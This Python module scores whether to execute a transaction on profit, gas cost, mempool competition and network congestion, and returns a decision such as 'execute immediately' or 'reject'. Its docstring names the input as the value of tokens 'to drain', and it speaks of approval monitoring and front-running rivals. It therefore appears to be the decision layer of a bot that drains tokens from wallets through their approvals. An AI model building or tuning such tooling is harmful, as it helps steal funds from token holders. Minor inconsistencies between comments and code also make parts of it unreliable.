"""
🧠 REAL-TIME DECISION ENGINE (POLICY LAYER)
Professional scoring system for approval monitoring.

Replaces simple rule-based logic with a sophisticated scoring model:
- Economic Value (Profitability)
- Success Probability
- Mempool Competition
- Gas Cost
- Network Status

Returns a Score (0-100) and a Decision (APPROVE/REJECT).
"""

import logging
from dataclasses import dataclass
from enum import Enum
from typing import Dict, Optional, Tuple

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class Decision(Enum):
    EXECUTE_IMMEDIATELY = "execute_immediately"  # Score > 80
    EXECUTE_NORMAL = "execute_normal"            # Score 50-80
    WAIT_FOR_BETTER_CONDITIONS = "wait"          # Score 20-50
    REJECT = "reject"                            # Score < 20

@dataclass
class ScoreComponents:
    economic_value: float
    success_probability: float
    competition_factor: float
    gas_efficiency: float
    network_health: float

class DecisionEngine:
    def __init__(self):
        # Weights for scoring (must sum to 1.0)
        self.weights = {
            "economic_value": 0.40,      # Most important: Is it profitable?
            "success_probability": 0.25, # Is it likely to succeed?
            "competition": 0.15,         # Are we competing with others?
            "gas_efficiency": 0.10,      # Is gas too high relative to value?
            "network_health": 0.10       # Is the network stable?
        }
        
        # Thresholds
        self.min_profit_usd = 5.0  # Minimum profit to consider execution
        
    def evaluate(
        self,
        token_value_usd: float,
        estimated_gas_cost_usd: float,
        competitors_count: int = 0,
        network_congestion_level: str = "normal",  # normal, high, extreme
        historical_success_rate: float = 0.95
    ) -> Tuple[Decision, float, Dict]:
        """
        Evaluate all factors and return a decision + score.
        
        Args:
            token_value_usd: Value of tokens to drain
            estimated_gas_cost_usd: Cost of transaction
            competitors_count: Number of pending txs for same target
            network_congestion_level: Network status
            historical_success_rate: Success rate for this token/method
            
        Returns:
            (Decision, Final Score, Detailed Metrics)
        """
        
        # 1. Economic Value Score (0-100)
        # Profit = Value - Gas
        # Score based on ROI and absolute profit
        profit = token_value_usd - estimated_gas_cost_usd
        if profit <= 0:
            economic_score = 0
        else:
            # Logarithmic scaling for value: $100 -> ~50, $1000 -> ~80, $10k+ -> 100
            # ROI scaling: 2x -> 50, 10x+ -> 100
            roi = token_value_usd / estimated_gas_cost_usd if estimated_gas_cost_usd > 0 else 100
            
            roi_score = min(roi * 5, 100) # Cap at 100
            abs_score = min(profit / 10, 100) # Simple linear up to $1000 profit
            
            economic_score = (roi_score * 0.4) + (abs_score * 0.6)

        # 2. Success Probability Score (0-100)
        success_score = historical_success_rate * 100

        # 3. Competition Score (0-100)
        # 0 competitors -> 100
        # 1 competitor -> 50
        # 2+ competitors -> 0 (High risk of failing/front-running)
        if competitors_count == 0:
            competition_score = 100
        elif competitors_count == 1:
            competition_score = 50
        else:
            competition_score = 10

        # 4. Gas Efficiency Score (0-100)
        # Lower gas relative to historical average is better
        # For simplicity:
        # Cost < $5 -> 100
        # Cost $5-$20 -> 70
        # Cost $20-$50 -> 40
        # Cost > $50 -> 10
        if estimated_gas_cost_usd < 5:
            gas_score = 100
        elif estimated_gas_cost_usd < 20:
            gas_score = 70
        elif estimated_gas_cost_usd < 50:
            gas_score = 40
        else:
            gas_score = 10

        # 5. Network Health Score (0-100)
        if network_congestion_level == "normal":
            network_score = 100
        elif network_congestion_level == "high":
            network_score = 60
        else: # extreme
            network_score = 20

        # --- Calculate Weighted Average ---
        final_score = (
            (economic_score * self.weights["economic_value"]) +
            (success_score * self.weights["success_probability"]) +
            (competition_score * self.weights["competition"]) +
            (gas_score * self.weights["gas_efficiency"]) +
            (network_score * self.weights["network_health"])
        )

        # --- Determine Decision ---
        if profit < self.min_profit_usd and final_score < 90:
            decision = Decision.REJECT
            reason = "Low profit"
        elif final_score >= 80:
            decision = Decision.EXECUTE_IMMEDIATELY
        elif final_score >= 50:
            decision = Decision.EXECUTE_NORMAL
        elif final_score >= 20:
            decision = Decision.WAIT_FOR_BETTER_CONDITIONS
        else:
            decision = Decision.REJECT
            reason = "Low score"

        details = {
            "scores": {
                "economic": round(economic_score, 1),
                "success": round(success_score, 1),
                "competition": round(competition_score, 1),
                "gas": round(gas_score, 1),
                "network": round(network_score, 1)
            },
            "metrics": {
                "profit_usd": round(profit, 2),
                "roi": round(token_value_usd / estimated_gas_cost_usd if estimated_gas_cost_usd > 0 else 0, 1),
                "final_score": round(final_score, 1)
            }
        }
        
        logger.info(f"🧠 Decision Engine: Score {final_score:.1f} -> {decision.name}")
        return decision, final_score, details

# Global instance
decision_engine = DecisionEngine()
